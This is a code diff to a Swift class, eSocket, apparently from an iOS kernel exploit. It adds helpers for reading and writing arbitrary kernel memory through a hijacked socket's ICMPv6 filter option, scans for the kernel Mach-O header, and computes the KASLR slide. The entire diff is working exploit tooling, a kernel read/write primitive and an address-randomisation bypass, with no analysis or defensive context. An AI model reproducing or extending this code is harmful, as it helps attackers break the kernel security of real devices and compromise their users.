@@ -15,6 +15,7 @@ class eSocket {
     var textPtr: UInt64 = 0
     var stashedAddr: UInt64 = 0
     var virtBase: UInt64 = 0
+    var virtSlide: UInt64 = 0
     
     let start: vm_address_t
     let count: Int
@@ -32,14 +33,15 @@ class eSocket {
         }
     }
     
-    private func findPattern(at ptr: vm_address_t, length: Int, byte: UInt8) -> vm_address_t? {
-        let base = UnsafeRawPointer(bitPattern: UInt(ptr))!
-        for i in 0..<length {
-            if base.load(fromByteOffset: i, as: UInt8.self) == byte {
-                return ptr + vm_address_t(i)
-            }
+
+    @inline(__always) private func findPattern(at ptr: vm_address_t, length: Int, byte: UInt8) -> vm_address_t? {
+        guard length > 0,
+              let base = UnsafeRawPointer(bitPattern: UInt(ptr)),
+              let hit = memchr(base, Int32(byte), length)
+        else {
+            return nil
         }
-        return nil
+        return vm_address_t(UInt(bitPattern: hit))
     }
     
     private func scanCandidates(ttl: UInt8, out: inout [vm_address_t]) {
@@ -116,7 +118,6 @@ class eSocket {
 
             print("[eSocket] Finding matches.")
             scanCandidates(ttl: UInt8(ttl), out: &inpcb)
-
             print("[eSocket] Confirming matches.")
             if let (fd, inpcb) = matchSocket(sockets: &socketFDs, candidates: inpcb) {
                 socketFD = fd
@@ -174,13 +175,27 @@ class eSocket {
         return outbuf
     }
     
+    func get8B(address: UInt64) -> UInt64? {
+        guard let out = get32B(address: address) else {
+            return nil
+        }
+        return UInt64(out.icmp6_filt.1) << 32 | UInt64(out.icmp6_filt.0)
+    }
+    
+    func get4B(address: UInt64) -> UInt32? {
+        guard let out = get32B(address: address) else {
+            return nil
+        }
+        return out.icmp6_filt.0
+    }
+    
     func set32B(address: UInt64, bytes: icmp6_filter) -> Bool {
         setAddress(address: address)
         defer {
             restoreObjectState()
         }
         var inbuf = bytes
-        let kr = setsockopt(socketFD, IPPROTO_IPV6, ICMP6_FILTER, &inbuf, socklen_t(MemoryLayout<icmp6_filter>.size))
+        let kr = setsockopt(socketFD, IPPROTO_ICMPV6, ICMP6_FILTER, &inbuf, socklen_t(MemoryLayout<icmp6_filter>.size))
         if kr != KERN_SUCCESS {
             print("[eSocket] setsockopt() failed.")
             return false
@@ -194,8 +209,10 @@ class eSocket {
             guard let out = get32B(address: readAddr) else {
                 return false
             }
-            if out.icmp6_filt.0 == 0xfeedfacf {
+            if out.icmp6_filt.0 == 0xfeedfacf && out.icmp6_filt.1 == 0x100000c && 
+                out.icmp6_filt.2 == 0xc0000002 && out.icmp6_filt.3 == 0x00000002 {
                 virtBase = readAddr
+                virtSlide = virtBase - 0xfffffe000700c000
                 return true
             }
             readAddr -= 0x4000
@@ -207,5 +224,15 @@ class eSocket {
             print("[eSocket] Unable to find kernel base.")
         }
         return virtBase
+    }
+    
+    func getSlide() -> UInt64 {
+        if(virtBase == 0 && findBase() == false) {
+            print("[eSocket] Unable to find kernel base.")
+        }
+        if(virtSlide == 0) {
+            virtSlide = virtBase - 0xfffffe000700c000
+        }
+        return virtSlide
     }
 }
